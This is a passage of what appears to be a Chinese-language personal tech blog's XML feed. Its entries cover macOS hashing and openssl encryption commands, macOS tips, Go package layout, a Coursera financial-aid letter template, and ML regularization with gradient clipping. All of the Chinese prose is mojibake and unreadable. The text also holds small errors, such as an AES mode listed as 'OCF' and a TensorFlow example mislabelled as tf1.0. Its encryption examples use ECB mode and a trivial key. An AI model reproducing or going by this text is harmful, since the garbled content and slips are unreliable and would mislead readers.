id="æœŸåˆŠä¸ä¼šè®®">æœŸåˆŠä¸ä¼šè®®</h2><p>åŒºåˆ†æ˜¯æœŸåˆŠè¿˜æ˜¯ä¼šè®®ä¸€èˆ¬è¿˜æ˜¯ä»¥å…³é”®å­—==conferenceï¼Œproceedingï¼ˆä¼šè®®ï¼‰ï¼Œarticleã€journalï¼ˆæœŸåˆŠï¼‰ä¸ºåŒºåˆ†ç‚¹ã€‚</p><p>ä¼šè®®ä¸€èˆ¬ EI æ”¶å½•ï¼ŒSCI ä¸»è¦æ”¶å½•æœŸåˆŠ</p>]]></content>
      
      
      <categories>
          
          <category> academic </category>
          
      </categories>
      
      
        <tags>
            
            <tag> sci </tag>
            
            <tag> jcr </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Mac commands about hash and encryption</title>
      <link href="/blog/2022/10/11/linux/macos/mac_encryp_tools/"/>
      <url>/blog/2022/10/11/linux/macos/mac_encryp_tools/</url>
      
        <content type="html"><![CDATA[<h2 id="base64-ç¼–è§£ç ">base64 ç¼–è§£ç </h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">base64 a.txt</span><br><span class="line">base64 -d a.txt</span><br><span class="line">echo -n &quot;hello&quot;|base64</span><br><span class="line">echo -n &quot;aGVsbG8=&quot;|base64 -d</span><br></pre></td></tr></table></figure><p>æµ‹è¯•</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ echo -n &quot;hello&quot; &gt; a.txt</span><br><span class="line">$ cat a.txt</span><br><span class="line">hello%</span><br><span class="line">$ cat a.txt|base64</span><br><span class="line">aGVsbG8=</span><br><span class="line">$ echo -n &quot;aGVsbG8=&quot;|base64 -d</span><br><span class="line">hello%</span><br></pre></td></tr></table></figure><h2 id="æ¶ˆæ¯æ‘˜è¦">æ¶ˆæ¯æ‘˜è¦</h2><p>ä¸‹é¢ä»¥å­—ç¬¦ä¸² hello å’Œæ–‡ä»¶ a.txt ä¸ºä¾‹</p><blockquote><p>æ³¨æ„ï¼š<code>echo -n</code> ä»£è¡¨ä¸å‘é€æ¢è¡Œç¬¦; ä¸å¸¦å‚æ•°é»˜è®¤å‘é€æ¢è¡Œç¬¦ã€‚cat é»˜è®¤ä¼šå¢åŠ æ¢è¡Œ</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">md5 a.txt</span><br><span class="line">md5 -s hello</span><br><span class="line"></span><br><span class="line">shasum -a 1/256/512 a.txt</span><br><span class="line">echo -n &quot;hello&quot;|shasum -a 1/256/512</span><br></pre></td></tr></table></figure><p>Linux ä¸‹æœ‰ md5sum</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">md5sum a.txt</span><br><span class="line">echo -n 123456 | md5sum</span><br></pre></td></tr></table></figure><h2 id="openssl">openssl</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">openssl md5 a.txt</span><br><span class="line">echo -n &quot;hello&quot;|openssl md5</span><br><span class="line"></span><br><span class="line">openssl sha1/256/512 a.txt</span><br><span class="line">echo -n &quot;hello&quot;|openssl sha1/256/512</span><br><span class="line"></span><br><span class="line">echo -n &quot;hello&quot;|openssl base64</span><br><span class="line">echo -n &quot;aGVsbG8=&quot;|openssl base64 -d</span><br></pre></td></tr></table></figure><p>AES/DES3 åŠ å¯†è§£å¯†</p><p>AES æœ‰äº”ç§åŠ å¯†æ¨¡å¼ï¼šCBCã€ECBã€CTRã€OCFã€CFBï¼Œä»¥ CBCåŠ å¯†æ¨¡å¼ä¸ºä¾‹ï¼Œå¯¹æ˜æ–‡ â€œplaintextâ€è¿›è¡ŒåŠ å¯†ï¼Œç»“æœä»¥ base64ç¼–ç æ ¼å¼è¾“å‡ºï¼Œå¯ä»¥åŠ  <code>-k</code>é€‰é¡¹æŒ‡å®šæ˜æ–‡å¯†é’¥ï¼Œä¹Ÿå¯ä»¥ç›´æ¥å›è½¦æŒ‰æç¤ºè¾“å…¥å¯†é’¥ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo -n &quot;plaintext&quot;|openssl aes-128-ecb -base64</span><br></pre></td></tr></table></figure><p>å¯¹æ˜æ–‡ â€˜plaintextâ€™ è¿›è¡Œ triple-DES åŠ å¯†ï¼Œä½¿ç”¨å¯†é’¥ 123456ï¼Œè¾“å‡ºç»“æœä»¥base64 ç¼–ç æ ¼å¼è¾“å‡ºã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &#x27;plaintext&#x27; |openssl des3 -k 123456 -base64</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
          <category> git </category>
          
      </categories>
      
      
        <tags>
            
            <tag> git </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>macOS ä½¿ç”¨å°æŠ€å·§</title>
      <link href="/blog/2022/09/16/linux/macos/mac_skills/"/>
      <url>/blog/2022/09/16/linux/macos/mac_skills/</url>
      
        <content type="html"><![CDATA[<h2 id="mac-compress-_macosx-æ–‡ä»¶å¤¹">MAC compress _MACOSX æ–‡ä»¶å¤¹</h2><p>macOS åœ¨å‹ç¼©æ–‡ä»¶å¤¹æ—¶ï¼Œä¼šè‡ªåŠ¨ç”Ÿæˆå¹¶åŠ å…¥ <code>_MACOSX</code>æ–‡ä»¶å¤¹ä½œä¸ºä¸€äº›ç¼“å­˜ï¼Œè¯¥æ–‡ä»¶å¤¹åœ¨ MACOS ä¸Šçœ‹ä¸åˆ°ï¼Œåœ¨ windowså¯ä»¥çœ‹å¾—åˆ°ã€‚</p><p>åˆ é™¤æ–¹å¼: <a href="https://sspai.com/post/44953">å¦‚ä½•åˆ é™¤ macOSå‹ç¼©åŒ…ä¸­çš„éšè—æ–‡ä»¶ | ä¸€æ—¥ä¸€æŠ€ - å°‘æ•°æ´¾</a> zip çš„å‡ è¡Œå‘½ä»¤å†™å…¥äº†automator, å³é”®-service è¿è¡Œå‡€åŒ– zipï¼Œç­‰å¾…å¼¹çª—æç¤ºå³å¯ã€‚</p><h2 id="mac-preview-å¤šæ ‡ç­¾æ‰“å¼€">Mac preview å¤šæ ‡ç­¾æ‰“å¼€</h2><p>system preference -&gt; General -&gt; Perfer tabs [é€‰é¡¹] when openingdocument</p><p>é€‰é¡¹å¤„é€‰æ‹© â€œalwaysâ€</p><h2 id="tmux">tmux</h2><p>å¼€å¯ tmux é¼ æ ‡æ»šåŠ¨ï¼š<ahref="https://superuser.com/questions/209437/how-do-i-scroll-in-tmux">Howdo I scroll in tmux? - Super User</a></p><h2 id="lsof">lsof</h2><p>netstatï¼š <code>netstat -tnl</code> æŸ¥çœ‹å¼€æ”¾çš„ç«¯å£<code>netstat -aux</code> æŸ¥çœ‹å¤šå°‘ä¸ªç½‘ç»œè¿æ¥</p><p>ä½¿ç”¨ lsof ä»£æ›¿ Mac OS X ä¸­çš„ netstat æŸ¥çœ‹å ç”¨ç«¯å£çš„ç¨‹åºå…³é—­ç›‘å¬æŸä¸ªç«¯å£çš„ç¨‹åºï¼š<code>kill -9 $(lsof -i:20002|awk '&#123;print $2&#125;'|sed -n 2p)</code></p><h2 id="å‚è€ƒèµ„æ–™">å‚è€ƒèµ„æ–™</h2><p><ahref="https://tonydeng.github.io/2016/07/07/use-lsof-to-replace-netstat/">ä½¿ç”¨lsof ä»£æ›¿ Mac OS X ä¸­çš„ netstat æŸ¥çœ‹å ç”¨ç«¯å£çš„ç¨‹åº</a></p>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
          <category> macos </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Golang åŒ…å’Œé¡¹ç›®ç»“æ„</title>
      <link href="/blog/2022/08/16/programming/go/go_package/"/>
      <url>/blog/2022/08/16/programming/go/go_package/</url>
      
        <content type="html"><![CDATA[<h1 id="go-åŒ…æ¦‚è¿°">Go åŒ…æ¦‚è¿°</h1><ul><li>åŒ…(package)æ˜¯ Goè¯­è¨€ä¸­ç»„ç»‡å•å…ƒ.åŒ…æ˜¯é€»è¾‘ä¸Šçš„åˆ†ç»„.è€Œç‰©ç†ä¸Šçš„åˆ†ç»„æ˜¯ä¸åŒçš„æ–‡ä»¶å¤¹,æ–‡ä»¶å¤¹å’ŒåŒ…ä¸€èˆ¬æ˜¯å¯¹åº”çš„</li><li>æŠŠå¤šä¸ªæ–‡ä»¶æ”¾å…¥åŒä¸€ä¸ªæ–‡ä»¶å¤¹ä¸­,è¿™äº›æ–‡ä»¶å°±æ˜¯åœ¨åŒä¸€ä¸ªåŒ…ä¸­.</li><li>è™½ç„¶å…è®¸æºç æ–‡ä»¶çš„ package å’Œæ–‡ä»¶å¤¹åä¸åŒä½†æ˜¯æœ€ç»ˆç¼–è¯‘åéƒ½ä¼šæŠŠæ–‡ä»¶çš„package ç¼–è¯‘æˆæ–‡ä»¶å¤¹åç§°.æ‰€ä»¥ä¸ºé˜²æ­¢é”™è¯¯æœ€å¥½æŠŠæ–‡ä»¶çš„ packageå’Œæ–‡ä»¶å¤¹åç§°è®¾ç½®æˆç›¸åŒçš„</li><li>ä¸€ä¸ª Go è¯­è¨€é¡¹ç›®å¿…é¡»è¦æœ‰ mainåŒ…,å…¶ä»–è‡ªå®šä¹‰åç§°çš„åŒ…ä¸ªæ•°ä»»æ„,æ ¹æ®è‡ªå·±çš„éœ€æ±‚å³å¯.</li><li>Go è¯­è¨€åœ¨å¯»æ‰¾åŒ…æ—¶ä¼šä» GOPATH/src è·¯å¾„ä¸­å¯»æ‰¾åŒ…,å¦‚æœä¸å­˜åœ¨å»GOROOT/src(Go è¯­è¨€æ ‡å‡†åº“æºç æ‰€åœ¨æ–‡ä»¶å¤¹)ä¸‹æ‰¾</li><li>ä¸åŒåŒ…ä¸‹èµ„æºå¯ä»¥ç›¸äº’è®¿é—®,åœ¨å¯¼å…¥å…¶ä»–åŒ…å,å¯ä»¥è®¿é—®åŒ…ä¸‹é¦–å­—æ¯å¤§å†™çš„å†…å®¹</li><li>åŒåŒ…ä¸‹ä¸åŒæ–‡ä»¶ä¸­å…¨å±€èµ„æºå¯ä»¥éšæ„è®¿é—®</li></ul><h2 id="go-æ ‡å‡†çš„é¡¹ç›®ç»“æ„">Go æ ‡å‡†çš„é¡¹ç›®ç»“æ„</h2><ul><li>åœ¨å®é™…å¼€å‘ä¸­ä¸å¯èƒ½åªæœ‰ä¸€ä¸ª main åŒ…,æ›´ä¸å¯èƒ½å°±åªæœ‰ä¸€ä¸ª.go æ–‡ä»¶.</li><li>ä¸åŒçº§åˆ«å¤§å°çš„é¡¹ç›®ä¸­åŒ…å’Œæ–‡ä»¶æ•°é‡éƒ½ä¸åŒ</li><li>Go è¯­è¨€ä¸­ç»„ç»‡å•å…ƒæœ€å¤§çš„ä¸ºé¡¹ç›®,é¡¹ç›®ä¸‹åŒ…å«åŒ…,ä¸€ä¸ªåŒ…å¯ä»¥æœ‰å¤šä¸ªæ–‡ä»¶</li><li>åŒ…åœ¨ç‰©ç†å±‚é¢ä¸Šå°±æ˜¯æ–‡ä»¶å¤¹.åŒä¸€ä¸ªæ–‡ä»¶å¤¹ä¸­å¤šä¸ªæ–‡ä»¶çš„ packageå¿…é¡»ç›¸åŒ,ä¸€èˆ¬ package å’Œæ‰€åœ¨æ–‡ä»¶å¤¹åç§°ç›¸åŒ</li><li>åœ¨ Goland ä¸­åˆ›å»ºæ ‡å‡† Go é¡¹ç›®</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">-- é¡¹ç›®å</span><br><span class="line">--src//æ‰€æœ‰æºä»£ç éƒ½å­˜æ”¾åˆ°è¿™ä¸ªæ–‡ä»¶</span><br><span class="line">--æ–‡ä»¶å¤¹  //æ–‡ä»¶å¤¹ä¸€èˆ¬ä¸ºåŒ…åç§°</span><br><span class="line">--xx.go//æºç æ–‡ä»¶</span><br><span class="line">--mm.go//æºç æ–‡ä»¶</span><br><span class="line">--æ–‡ä»¶å¤¹</span><br><span class="line">--xx.go</span><br><span class="line">--main.go//ä¸»å‡½æ•°æ‰€åœ¨æ–‡ä»¶,åç§°ä»»æ„,æ³¨æ„main.goåœ¨é¡¹ç›®æ ¹ç›®å½•</span><br><span class="line">--bin å­˜æ”¾å°å·¥å…·</span><br><span class="line">--pkg ç³»ç»Ÿç¼–è¯‘åç”Ÿæˆçš„å†…å®¹//è‡ªåŠ¨ç”Ÿæˆ,ä¸éœ€è¦åˆ›å»º</span><br></pre></td></tr></table></figure><h2 id="è‡ªå®šä¹‰åŒ…">è‡ªå®šä¹‰åŒ…</h2><ul><li><p>æ–°å»ºé¡¹ç›®ååœ¨é¡¹ç›®ä¸‹æ–°å»º src æ–‡ä»¶å¤¹,åœ¨ src æ–‡ä»¶å¤¹ä¸­æ–°å»º demoæ–‡ä»¶</p></li><li><p>åœ¨ demo æ–‡ä»¶ä¸­æ–°å»º demo1.go å’Œ demo2.go æ–‡ä»¶</p></li><li><p>demo1.go æ–‡ä»¶æºç å¦‚ä¸‹</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> demo<span class="comment">//åŒ…ä¸ºdemo</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">demo1</span><span class="params">()</span></span>&#123;</span><br><span class="line">    fmt.Println(<span class="string">&quot;æ‰§è¡Œdemo1&quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>demo2.go æ–‡ä»¶æºç å¦‚ä¸‹</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> demo<span class="comment">//åŒ…ä¸ºdemo</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Demo2</span><span class="params">()</span></span>  &#123;<span class="comment">//å‡½æ•°åå¤§å†™æ‰èƒ½è¢«å…¶ä»–åŒ…è®¿é—®</span></span><br><span class="line">    fmt.Println(<span class="string">&quot;æ‰§è¡Œdemo2&quot;</span>)</span><br><span class="line">    demo1()<span class="comment">//åŒåŒ…ä¸‹å†…å®¹ä»»æ„è®¿é—®</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>åœ¨é¡¹ç›®æ ¹ç›®å½•ä¸‹æ–°å»º main.go,æºç å¦‚ä¸‹</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;demo&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    demo.Demo2()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul>]]></content>
      
      
      <categories>
          
          <category> Golang </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>coursera ç”³è¯·åŠ©å­¦é‡‘æ¨¡ç‰ˆ</title>
      <link href="/blog/2022/08/16/misc/coursera_templates/"/>
      <url>/blog/2022/08/16/misc/coursera_templates/</url>
      
        <content type="html"><![CDATA[<h2 id="æ‚¨ä¸ºä½•ç”³è¯·åŠ©å­¦é‡‘">æ‚¨ä¸ºä½•ç”³è¯·åŠ©å­¦é‡‘ï¼Ÿ</h2><p>I am very interested in this course. I believe that this course caneffectively help me in the field of machine learning and make myprofessional skills more perfect.</p><p>However, since I am now a full-time student who does not have a job,I can't afford the extra monthly study fee by relying on scholarshipsand daily part-time tuition and living expenses.</p><p>I graduated with a bachelor's degree from UESTC(University ofElectronic Science and Technology of China) in China. Now, I am a PhD inSJTU (Shanghai JiaoTong University) in China. The ability to learn,adapt, communicate, and organize is excellent. I believe that there willbe achievements in society in the future. I have also been activelyrepaying the society. I have volunteered for a year in the Women andChildren's Hospital to participate in the rehabilitation of autisticangels. I also actively participate in various educationalactivities.</p><p>I am determined to complete this course, please give me thisopportunity.</p><h2id="æ‚¨æ‰€é€‰çš„è¯¾ç¨‹å°†å¦‚ä½•å¸®åŠ©æ‚¨å®ç°ç›®æ ‡">æ‚¨æ‰€é€‰çš„è¯¾ç¨‹å°†å¦‚ä½•å¸®åŠ©æ‚¨å®ç°ç›®æ ‡</h2><p>I am a student majoring in computer science, the course involvesmachine learning, math etc.</p><p>During the learning process, I gradually discovered the need to digdeep into artificial intelligence, which can give enterprises a view oftrends in customer behavior and business operational patterns, as wellas supports the development of new products When it comes time to work.And this course can help me start with basic programming, better handlebig data and analyze trends through programming.</p><p>In addition, Machine learning has gradually become a must-have skillin computer science-related job requirements. After studying thiscourse, I can better enrich my professional skills and become aprofessional with not only theoretical knowledge but also operationalability. I hope that after graduation, I can find a career related tomachine learning, mainly in artificial intelligence and machinelearning.</p><p>I would appreciate it if you could give me an opportunity forlearning this course.</p>]]></content>
      
      
      <categories>
          
          <category> misc </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Regularization in Machine Learning</title>
      <link href="/blog/2022/07/15/ml/ml_regularization/"/>
      <url>/blog/2022/07/15/ml/ml_regularization/</url>
      
        <content type="html"><![CDATA[<p>åœ¨æœºå™¨å­¦ä¹ è®­ç»ƒè¿‡ç¨‹ä¸­,å¦‚æœæ¢¯åº¦/æƒé‡å˜å¾—è¿‡å¤§,ç”šè‡³å˜æˆ nan, æˆ–è€… lossè¿‡å¤§ã€å¼‚å¸¸è·³è·ƒ,ç”šè‡³å˜æˆ nan, ä¾¿å‡ºç°äº†æ‰€è°“çš„æ¢¯åº¦çˆ†ç‚¸é—®é¢˜.æ¢¯åº¦çˆ†ç‚¸é—®é¢˜æ˜¯æŒ‡åœ¨è®­ç»ƒè¿‡ç¨‹ä¸­æ¢¯åº¦èŒƒæ•°çš„å¤§å¹…åº¦å¢åŠ ,ä»è€Œå¯¼è‡´ç½‘ç»œæ— æ³•ä»è®­ç»ƒæ•°æ®ä¸­å­¦ä¹ ,æ¢¯åº¦ä¸‹é™æ— æ³•æ‰§è¡Œ,å­¦ä¸åˆ°æœ€ä¼˜è§£.</p><p>æ¢¯åº¦çˆ†ç‚¸çš„è¯†åˆ«:</p><p>å‡†ç¡®åº¦ä¸Šä¸å»,</p><ol type="1"><li>è¾“å‡º loss å€¼, çœ‹ loss æ˜¯å¦è¿‡å¤§ã€æœ‰å¼‚å¸¸è·³è·ƒæƒ…å†µ</li><li>è¾“å‡ºæ¢¯åº¦çš„èŒƒæ•°, çœ‹æ˜¯å¦å‘ˆæŒ‡æ•°å¢é•¿</li><li>è°ƒè¯•çœ‹æƒé‡/æ¢¯åº¦çš„å¤§å°</li></ol><h2 id="solution-to-exploding-gradients">Solution to explodinggradients</h2><p>æ¢¯åº¦çˆ†ç‚¸çš„åŸºæœ¬è§£å†³æ–¹æ³•æœ‰ 3 ç§:</p><ol type="1"><li><p>L1 Regularization</p></li><li><p>L2 Regularization</p><p>L2 Regularization ç›¸å½“äºå¯¹ç½‘ç»œä¸­çš„æŸå¤±å‡½æ•°åº”ç”¨ weight decay</p></li><li><p>Gradient clipping</p></li></ol><p>å¯¹äºæ¨¡å‹æƒé‡ç³»æ•° æ±‚è§£æ˜¯é€šè¿‡æœ€å°åŒ–ç›®æ ‡å‡½æ•°å®ç°çš„ã€‚æ­£åˆ™åŒ–æ–¹æ³•é€šè¿‡åœ¨Loss å‡½æ•°ä¸­åŠ æƒ©ç½šé¡¹æ¥é˜²æ­¢ overfittingã€‚L1 æ­£åˆ™åŒ–å’Œ L2æ­£åˆ™åŒ–,äºŒè€…åˆ†åˆ«ç›¸å½“äºåœ¨ Loss å‡½æ•°ä¸­å¢åŠ æƒé‡çš„ L1 èŒƒæ•°å’Œ L2 èŒƒæ•°ã€‚</p><p><span class="math display">\[\begin{aligned}&amp;l_1: \Omega(w)=\|w\|_1=\sum_i\left|w_i\right| \\&amp;l_2: \Omega(w)=\|w\|_2^2=\sum_i w_i^2\end{aligned}\]</span></p><p>åŠ äº†ä¹‹åçš„æƒé‡ä¼˜åŒ–å…¬å¼å¦‚ä¸‹ï¼š</p><p><span class="math display">\[\begin{aligned}\mathbf{w}^* &amp;=\arg \min _{\mathbf{w}}\sum_j\left(t\left(\mathbf{x}_j\right)-\sum_i w_ih_i\left(\mathbf{x}_j\right)\right)^2+\lambda\sum_{i=1}^k\left|w_i\right| \\\mathbf{w}^* &amp;=\arg \min _{\mathbf{w}}\sum_j\left(t\left(\mathbf{x}_j\right)-\sum_i w_ih_i\left(\mathbf{x}_j\right)\right)^2+\lambda \sum_{i=1}^k w_i^2\end{aligned}\]</span></p><p>ä¸¤ä¸ªæ­£åˆ™é¡¹åŒºåˆ«ï¼š</p><p>L1normï¼šå¯¹è¾“å…¥ç‰¹å¾è¿›è¡Œè¿‡æ»¤ï¼ˆä¸€éƒ¨åˆ†ç‰¹å¾ä¿ç•™ï¼Œä¸€éƒ¨åˆ†ç‰¹å¾ç§»é™¤ï¼‰ï¼Œä¼šæŠŠä¸é‡è¦çš„ç‰¹å¾ç›´æ¥ç½®é›¶ï¼Œäº§ç”Ÿç¨€ç–æ€§æ•ˆæœ</p><p>L2 normï¼š</p><ol type="1"><li>æ§åˆ¶ç‰¹å¾å€¼çš„èŒƒå›´ï¼Œä½¿å…¶ä¸è¦è¿‡å¤§ï¼Œäº§ç”Ÿå¹³æ»‘æ•ˆæœ</li><li>L2 è®¡ç®—æ–¹ä¾¿ï¼Œè€Œ L1 åœ¨ç‰¹åˆ«æ˜¯éç¨€ç–å‘é‡ä¸Šçš„è®¡ç®—æ•ˆç‡å°±å¾ˆä½ï¼›</li><li>L2 Norm å¯¹å¤§æ•°çš„æƒ©ç½šæ›´å¤§ï¼Œå¯¹ outlier æ›´æ•æ„Ÿï¼Œå› ä¸ºä½¿ç”¨ L2 Normæ±‚å‡ºæ¥çš„è§£æ˜¯æ¯”è¾ƒå‡åŒ€çš„ï¼Œè€Œ L1 Norm å¸¸å¸¸äº§ç”Ÿç¨€ç–è§£ã€‚</li></ol><p>å®é™…åº”ç”¨è¿‡ç¨‹ä¸­ï¼ŒL1 norm å‡ ä¹æ²¡æœ‰æ¯” L2 norm è¡¨ç°å¥½çš„æ—¶å€™ï¼Œä¼˜å…ˆä½¿ç”¨ L2norm æ˜¯æ¯”è¾ƒå¥½çš„é€‰æ‹©ã€‚</p><h2 id="gradient-clipping">Gradient clipping</h2><p>è€Œå¯¹æƒé‡/æ¢¯åº¦è¿›è¡Œçº¦æŸè£å‰ª,é¿å…æ¨¡å‹è¶Šè¿‡æœ€ä¼˜ç‚¹,æ˜¯è§£å†³æ¢¯åº¦çˆ†ç‚¸çš„æœ‰æ•ˆæ–¹æ³•ä¹‹ä¸€.</p><p>æ¢¯åº¦è£å‰ªæ˜¯é€šè¿‡åœ¨ç½‘ç»œåå‘ä¼ æ’­è¿‡ç¨‹ä¸­,å°†æ¢¯åº¦è£å‰ªåˆ°ä¸€ä¸ªé˜ˆå€¼,é€šè¿‡è£å‰ªçš„æ¢¯åº¦æ›´æ–°æƒé‡,å®ç°å¯¹æƒé‡æ›´æ–°çš„ç¼©æ”¾ï¼Œä»è€Œé™ä½æº¢å‡ºçš„å¯èƒ½ã€‚</p><p>æ¢¯åº¦è£å‰ªä¸»è¦åˆ†ä¸ºä¸¤ç§: Clipping-by-value, Clipping-by-norm</p><h2 id="gradient-clipping-by-value">Gradient clipping-by-value</h2><p>æŒ‰ç…§å€¼è£å‰ª: å®šä¹‰ a minimum clip value å’Œ a maximum clip value,å°†è¶…å‡ºè¿™ä¸ªèŒƒå›´çš„æ¢¯åº¦, è£å‰ªä¸ºå¯¹åº”é˜ˆå€¼.(â€–gradientâ€–æ˜¯æ¢¯åº¦çš„èŒƒæ•°)</p><p>ä¼ªä»£ç :</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gradient â† âˆ‚C/âˆ‚W</span><br><span class="line">if â€–gradientâ€– â‰¥ max_threshold or â€–gradientâ€– â‰¤ min_threshold then</span><br><span class="line"> gradient = threshold (accordingly)</span><br></pre></td></tr></table></figure><h2 id="gradient-clipping-by-norm">Gradient clipping-by-norm</h2><p>clipping-by-norm çš„æ€æƒ³ç±»ä¼¼äº clipping-by-valueã€‚ä¸åŒä¹‹å¤„åœ¨äº,æˆ‘ä»¬é€šè¿‡å°†æ¢¯åº¦çš„å•ä½å‘é‡ä¸é˜ˆå€¼ç›¸ä¹˜æ¥è£å‰ªæ¢¯åº¦ã€‚å› ä¸º g/â€–gâ€– æ˜¯ä¸€ä¸ªå•ä½å‘é‡,åœ¨é‡æ–°ç¼©æ”¾ä¹‹å, ä½¿å¾—æ¢¯åº¦çš„ L2 norm å°äºç­‰äºé¢„è®¾çš„ clip_norm.</p><p>ä¼ªä»£ç :</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">g â† âˆ‚C/âˆ‚W</span><br><span class="line">if â€–gâ€– â‰¥ threshold then</span><br><span class="line">   g = threshold * g/â€–gâ€–</span><br><span class="line">% or</span><br><span class="line">% g /= max(1, â€–gâ€–/threshold)</span><br></pre></td></tr></table></figure><h2 id="æ·±åº¦å­¦ä¹ æ¡†æ¶">æ·±åº¦å­¦ä¹ æ¡†æ¶</h2><p>é€šå¸¸åœ¨ backward å¾—åˆ°æ¢¯åº¦ä¹‹åï¼Œstep() æ›´æ–°ä¹‹å‰ï¼Œä½¿ç”¨æ¢¯åº¦å‰ªè£,ç»§è€Œè¿›è¡Œç½‘ç»œæ›´æ–°çš„è¿‡ç¨‹ã€‚</p><h3 id="tensorflow">tensorflow</h3><p>åœ¨ tf1.0 ä¸­:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"># Compute gradients.</span><br><span class="line">gradients = tape.gradient(loss, trainable_variables)</span><br><span class="line"></span><br><span class="line"># two methods, use one of them is enough.</span><br><span class="line"># Clip-by-value on all trainable gradients</span><br><span class="line">gradients = [(tf.clip_by_value(grad, clip_value_min=-1.0,clip_value_max=1.0)) for grad in gradients]</span><br><span class="line"></span><br><span class="line"># clip-by-norm</span><br><span class="line">gradients = [(tf.clip_by_norm(grad, clip_norm=2.0)) for grad in gradients]</span><br></pre></td></tr></table></figure><p>åœ¨ tf2 ä¸­:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">from tensorflow.keras import optimizers</span><br><span class="line">sgd = optimizers.SGD(lr=0.01, clipvalue=0.5)</span><br></pre></td></tr></table></figure><blockquote><p><code>clipnorm</code> : float or None. If set, clips gradients to amaximum norm. <code>clipvalue</code>: float or None. If set, clipsgradients to a maximum value.</p></blockquote><h3 id="pytorch">PyTorch</h3><p>å› ä¸º PyTorchæ˜¯å°†æ¢¯åº¦å­˜å‚¨åœ¨å‚æ•°ä¸­,æ‰€ä»¥è¿™é‡Œç›´æ¥å°†æ¨¡å‹å‚æ•°ä¼ åˆ°è£å‰ªå‡½æ•°ä¸­.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">loss.backward()</span><br><span class="line"></span><br><span class="line"># Gradient Norm Clipping</span><br><span class="line">#nn.utils.clip_grad_norm_(model.parameters(), max_norm=2.0, norm_type=2)</span><br><span class="line">#Gradient Value Clipping</span><br><span 